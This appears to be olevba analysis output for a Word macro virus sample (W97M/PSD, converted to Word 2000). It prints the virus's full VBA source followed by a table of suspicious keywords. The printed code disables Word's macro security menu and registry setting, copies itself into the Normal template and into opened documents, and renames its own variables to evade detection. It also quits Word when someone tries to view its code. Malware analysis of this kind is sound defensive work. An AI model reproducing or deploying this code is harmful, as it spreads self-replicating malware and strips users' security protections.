olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Psd.a-bad19f7ceb02cd8d6c72abb43a4a544788abb843
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Psd.a-bad19f7ceb02cd8d6c72abb43a4a544788abb843 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
Private Sub Document_Open()
On Error Resume Next
' W97M/PSD by ALT-F11, VAMP Poly by VicodinES
' Converted to W2000/PSD by VicodinES
CommandBars("Macro").Controls("Security...").Enabled = False
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
If Day(Now) = Minute(Now) Then
Randomize: For CN525 = 1 To (Int(Rnd * 70))
ActiveDocument.Shapes.AddShape(Int(Rnd * 120), Int(Rnd * 200), Int(Rnd * 500), Int(Rnd * 500), Int(Rnd * 500)).Select
Selection.ShapeRange.Fill.ForeColor.RGB = RGB(Int(Rnd * 255), Int(Rnd * 255), Int(Rnd * 255))
Selection.ShapeRange.Fill.Visible = msoTrue
Selection.ShapeRange.Fill.Solid: Next CN525: End If
BH7895 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
QJ4738 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
If Left(ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Pri" Then
Set UI3958 = ActiveDocument.VBProject.VBComponents.Item(1)
DG7899 = True
End If
If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Pri" Then
Set UI3958 = NormalTemplate.VBProject.VBComponents.Item(1)
FL1050 = True
Call MR34_NF972
ActiveDocument.Saved = True
End If
If FL1050 <> True And DG7899 <> True Then GoTo MM2072
If FL1050 = True Then UI3958.CodeModule.AddFromString ("Private Sub Document_Close()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, BH7895 - 1) & vbCr & "Sub ViewVBCode()" & vbCr & "Application.Quit SaveChanges:=wdDoNotSaveChanges" & vbCr & "End Sub")
If DG7899 = True Then UI3958.CodeModule.AddFromString ("Private Sub Document_Open()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, QJ4738 - 4))
MM2072:
If QJ4738 <> 0 And BH7895 = 0 And (InStr(1, ActiveDocument.Name, "Document") = False) Then
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
ElseIf (InStr(1, ActiveDocument.Name, "Document") <> False) Then
ActiveDocument.Saved = True: End If
End Sub
Private Function MR34_NF972()
On Error Resume Next
Randomize
Dim r1(1 To 15) As String
r1(1) = "AU759": r1(2) = "AS2945": r1(3) = "BS9012": r1(4) = "SM40": r1(5) = "NF972": r1(6) = "BH7895"
r1(7) = "QJ4738": r1(8) = "DG7899":: r1(9) = "UI3958": r1(10) = "FL1050": r1(11) = "MM2072": r1(12) = "MR34": r1(13) = "IC7966": r1(14) = "BT6591": r1(15) = "CN525"
For CN525 = 1 To 15
a1 = (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & Int(Rnd * 100) & Int(Rnd * 100)
Call NF972(a1, r1(CN525))
Next CN525
End Function
Private Function NF972(BT6591, IC7966 As String)
On Error Resume Next
Dim AU759 As Long: Dim AS2945 As Long: Dim BS9012 As Long: Dim SM40 As Long
With ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
AU759 = 1: AS2945 = 1: BS9012 = .CountOfLines: SM40 = Len(.Lines(.CountOfLines, 1))
Do While .Find(IC7966, AU759, AS2945, BS9012, SM40, True)
strline = .Lines(AU759, 1)
strline = Left(strline, AS2945 - 1) & BT6591 & Mid(strline, SM40)
.replaceline AU759, strline
AU759 = BS9012 + 1: AS2945 = 1:
BS9012 = .CountOfLines
SM40 = Len(.Lines(.CountOfLines, 1))
Loop
End With
End Function
Sub ViewVBCode()
Application.Quit SaveChanges:=wdDoNotSaveChanges
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

